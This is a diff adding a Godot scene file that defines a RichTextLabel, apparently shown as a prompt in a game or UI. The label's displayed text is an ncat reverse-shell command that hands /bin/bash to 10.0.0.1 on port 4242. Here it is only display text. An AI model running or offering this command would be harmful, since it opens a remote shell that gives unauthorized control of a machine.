@@ -1,0 +1,12 @@
+[gd_scene load_steps=2 format=3 uid="uid://brrjjndyjduir"]
+
+[ext_resource type="Script" path="res://prompt.gd" id="1_mcara"]
+
+[node name="RichTextLabel" type="RichTextLabel"]
+size_flags_vertical = 0
+bbcode_enabled = true
+text = "ncat 10.0.0.1 4242 -e /bin/bash"
+fit_content = true
+scroll_active = false
+visible_characters_behavior = 1
+script = ExtResource("1_mcara")
